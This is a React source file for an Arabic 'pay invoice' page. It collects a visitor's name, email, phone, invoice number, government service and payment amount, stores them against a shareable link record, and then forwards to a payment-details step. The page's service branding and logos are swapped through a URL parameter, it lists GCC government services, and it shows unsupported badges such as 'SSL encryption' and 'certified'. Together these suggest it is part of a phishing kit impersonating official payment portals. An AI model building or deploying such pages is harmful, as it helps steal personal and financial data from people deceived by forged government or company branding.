import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { getServiceBranding } from "@/lib/serviceLogos";
import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Shield, Lock, CheckCircle, FileText } from "lucide-react";

const PaymentData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();

  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [selectedService, setSelectedService] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || 'payment';

  const serviceName = "دفع فاتورة";
  const branding = getServiceBranding(serviceKey);
  const paymentInfo = linkData?.payload as any;

  const countryCode = paymentInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  const governmentServices = useMemo(
    () => getGovernmentServicesByCountry(countryCode),
    [countryCode]
  );

  const selectedServiceData = useMemo(
    () => governmentServices.find(s => s.key === selectedService),
    [governmentServices, selectedService]
  );

  const rawAmount = paymentInfo?.payment_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  useState(() => {
    if (amount && !paymentAmount) {
      setPaymentAmount(amount.toString());
    }
  });

  const displayAmount = paymentAmount ? parseFloat(paymentAmount) : amount;
  const formattedAmount = formatCurrency(displayAmount, countryCode);

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    try {
      const updatedData = {
        ...linkData.payload,
        payment_data: {
          customer_name: customerName,
          customer_email: customerEmail,
          customer_phone: customerPhone,
          invoice_number: invoiceNumber,
          selected_service: selectedService,
          selected_service_name: selectedServiceData?.nameAr || selectedService,
          payment_amount: parseFloat(paymentAmount) || amount,
          currency_code: getCurrencyCode(countryCode),
        },
        selectedCountry: countryCode,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedData,
      });

      navigate(`/pay/${id}/details`);
    } catch (error) {
      console.error("Error updating payment data:", error);
    }
  };

  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formatCurrency(amount, countryCode)}
        title="دفع فاتورة - إكمال البيانات"
        description="قم بإكمال بيانات السداد لدفع الفاتورة"
      />
      <div className="min-h-screen bg-gray-50" dir="rtl">
        <div 
          className="w-full shadow-md"
          style={{ 
            background: `linear-gradient(135deg, ${branding?.colors.primary || countryData?.primaryColor}, ${branding?.colors.secondary || countryData?.secondaryColor})`,
            minHeight: '80px'
          }}
        >
          <div className="container mx-auto px-4 py-4">
            <div className="flex items-center justify-between max-w-4xl mx-auto">
              <div className="flex items-center gap-3">
                {branding?.logo && (
                  <div className="bg-white rounded-lg p-2 shadow-md">
                    <img 
                      src={branding.logo} 
                      alt={serviceName}
                      className="h-10 w-auto"
                      onError={(e) => e.currentTarget.style.display = 'none'}
                    />
                  </div>
                )}
                <div className="text-white">
                  <h1 className="text-lg sm:text-xl font-bold">{serviceName}</h1>
                  <p className="text-xs sm:text-sm opacity-90">بوابة الدفع الآمنة</p>
                </div>
              </div>
              
              <div className="text-white text-left">
                <p className="text-xs opacity-90">المبلغ</p>
                <p className="text-lg font-bold">{formattedAmount}</p>
              </div>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-4 py-8 max-w-3xl">
          <div className="mb-6 flex items-center justify-center gap-3 flex-wrap">
            <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: (branding?.colors.primary || countryData?.primaryColor) + '30' }}>
              <Shield className="w-5 h-5" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
              <span className="text-sm font-semibold" style={{ color: branding?.colors.primary || countryData?.primaryColor }}>تشفير SSL</span>
            </div>
            <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: (branding?.colors.primary || countryData?.primaryColor) + '30' }}>
              <Lock className="w-5 h-5" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
              <span className="text-sm font-semibold" style={{ color: branding?.colors.primary || countryData?.primaryColor }}>دفع آمن</span>
            </div>
            <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: (branding?.colors.primary || countryData?.primaryColor) + '30' }}>
              <CheckCircle className="w-5 h-5" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
              <span className="text-sm font-semibold" style={{ color: branding?.colors.primary || countryData?.primaryColor }}>معتمد</span>
            </div>
          </div>

          <Card className="shadow-xl border-0">
            <div 
              className="p-4 sm:p-6 rounded-t-xl"
              style={{ background: `linear-gradient(to left, ${branding?.colors.primary || countryData?.primaryColor}15, ${branding?.colors.secondary || countryData?.secondaryColor}15)` }}
            >
              <div className="flex items-center gap-3">
                <div
                  className="w-12 h-12 rounded-xl flex items-center justify-center shadow-md"
                  style={{ background: `linear-gradient(135deg, ${branding?.colors.primary || countryData?.primaryColor}, ${branding?.colors.secondary || countryData?.secondaryColor})` }}
                >
                  <FileText className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-xl sm:text-2xl font-bold text-gray-800">
                    إكمال بيانات السداد
                  </h2>
                  <p className="text-sm text-gray-600">أدخل معلومات الفاتورة والدفع</p>
                </div>
              </div>
            </div>

            <form onSubmit={handleProceed} className="p-6 sm:p-8">
              <div className="space-y-5">
                <div>
                  <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <User className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
                    الاسم الكامل *
                  </Label>
                  <Input
                    id="name"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding?.colors.primary || countryData?.primaryColor } as any}
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>

                <div>
                  <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <Mail className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
                    البريد الإلكتروني *
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding?.colors.primary || countryData?.primaryColor } as any}
                    placeholder="example@email.com"
                    dir="ltr"
                  />
                </div>

                <div>
                  <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <Phone className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
                    رقم الهاتف *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding?.colors.primary || countryData?.primaryColor } as any}
                    placeholder={`${phoneCode} ${phonePlaceholder}`}
                    dir="ltr"
                  />
                  <p className="text-xs text-gray-500 mt-1">مثال: {phoneCode} {phonePlaceholder}</p>
                </div>

                <div>
                  <Label htmlFor="invoice" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <Hash className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
                    الرقم المفوتر *
                  </Label>
                  <Input
                    id="invoice"
                    value={invoiceNumber}
                    onChange={(e) => setInvoiceNumber(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding?.colors.primary || countryData?.primaryColor } as any}
                    placeholder="مثال: INV-12345"
                  />
                </div>

                <div>
                  <Label className="mb-2 text-sm font-semibold flex items-center gap-2">
                    <FileText className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
                    الخدمة الحكومية/العامة *
                  </Label>
                  <Select value={selectedService} onValueChange={setSelectedService}>
                    <SelectTrigger className="h-12 border-2">
                      <SelectValue placeholder="اختر الخدمة" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {governmentServices.map((service) => (
                        <SelectItem key={service.id} value={service.key}>
                          {service.nameAr}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  {selectedServiceData && (
                    <p className="text-xs text-gray-600 mt-2 pr-2">
                      ℹ️ {selectedServiceData.description}
                    </p>
                  )}
                </div>

                <div>
                  <Label htmlFor="amount" className="flex items-center gap-2 mb-2 text-sm font-semibold">
                    <CreditCard className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
                    مبلغ السداد *
                  </Label>
                  <Input
                    id="amount"
                    type="number"
                    value={paymentAmount}
                    onChange={(e) => setPaymentAmount(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-[var(--primary-color)] transition-colors"
                    style={{ '--primary-color': branding?.colors.primary || countryData?.primaryColor } as any}
                    placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
                    step="0.01"
                    min="0"
                    dir="ltr"
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    المبلغ الافتراضي: {formatCurrency(amount, countryCode)}
                  </p>
                </div>
              </div>

              <div className="mt-8 space-y-4">
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-lg py-7 text-white font-bold shadow-lg hover:shadow-xl transition-all"
                  style={{
                    background: `linear-gradient(135deg, ${branding?.colors.primary || countryData?.primaryColor}, ${branding?.colors.secondary || countryData?.secondaryColor})`
                  }}
                  disabled={!customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                >
                  <span className="ml-2">متابعة للدفع</span>
                  <ArrowLeft className="w-5 h-5 mr-2" />
                </Button>

                <div 
                  className="p-4 rounded-lg border-2"
                  style={{ 
                    background: `${branding?.colors.primary || countryData?.primaryColor}08`,
                    borderColor: `${branding?.colors.primary || countryData?.primaryColor}30`
                  }}
                >
                  <div className="flex items-start gap-3">
                    <Shield className="w-5 h-5 mt-0.5" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
                    <div>
                      <p className="text-sm font-semibold mb-1" style={{ color: branding?.colors.primary || countryData?.primaryColor }}>
                        دفع آمن ومشفر بالكامل
                      </p>
                      <p className="text-xs text-gray-600">
                        معلوماتك الشخصية محمية بأعلى معايير الأمان والتشفير. نحن نستخدم بروتوكول SSL لحماية بياناتك.
                      </p>
                    </div>
                  </div>
                </div>

                <p className="text-xs text-center text-gray-500">
                  بالمتابعة، أنت توافق على الشروط والأحكام
                </p>
              </div>
            </form>
          </Card>

          <div className="mt-6 flex items-center justify-center gap-4 text-xs text-gray-500">
            <div className="flex items-center gap-1">
              <Lock className="w-3 h-3" />
              <span>معلوماتك مشفرة</span>
            </div>
            <span>•</span>
            <div className="flex items-center gap-1">
              <Shield className="w-3 h-3" />
              <span>حماية كاملة</span>
            </div>
            <span>•</span>
            <div className="flex items-center gap-1">
              <CheckCircle className="w-3 h-3" />
              <span>نظام موثوق</span>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentData;
